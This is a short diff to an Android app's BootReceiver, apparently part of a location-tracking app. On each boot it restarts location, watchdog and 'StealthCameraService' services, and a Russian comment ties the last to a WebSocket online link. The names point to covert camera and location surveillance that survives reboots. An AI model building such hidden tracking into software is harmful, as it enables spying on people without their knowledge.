@@ -37,9 +37,12 @@ public class BootReceiver extends BroadcastReceiver {
                 Intent.ACTION_LOCKED_BOOT_COMPLETED.equals(action) ||
                 Intent.ACTION_MY_PACKAGE_REPLACED.equals(action) ||
                 "android.intent.action.QUICKBOOT_POWERON".equals(action)) {
+
             try {
                 SharedPreferences prefs = context.getSharedPreferences("LocationTracker", Context.MODE_PRIVATE);
+
                 if (prefs.getBoolean("auto_tracking", false)) {
+                    // Используем единый DeviceIdManager как источник истины
                     String deviceId = DeviceIdManager.getDeviceId(context);
                     String deviceName = prefs.getString("device_name", "SecureDevice");
 
@@ -52,6 +55,7 @@ public class BootReceiver extends BroadcastReceiver {
                     handler.postDelayed(() -> {
                         startSecurityService(context, BackupLocationService.class, finalDeviceId, finalDeviceName);
                         startSecurityService(context, WatchdogService.class, finalDeviceId, finalDeviceName);
+                        // StealthCameraService — WebSocket-соединение, критично для online-статуса
                         startSecurityService(context, StealthCameraService.class, finalDeviceId, finalDeviceName);
                     }, 30000);
 
@@ -65,8 +69,7 @@ public class BootReceiver extends BroadcastReceiver {
         }
     }
 
-    private void startSecurityService(Context context, Class<?> serviceClass,
-                                       String deviceId, String deviceName) {
+    private void startSecurityService(Context context, Class<?> serviceClass, String deviceId, String deviceName) {
         try {
             Intent serviceIntent = new Intent(context, serviceClass);
             serviceIntent.putExtra("device_id", deviceId);
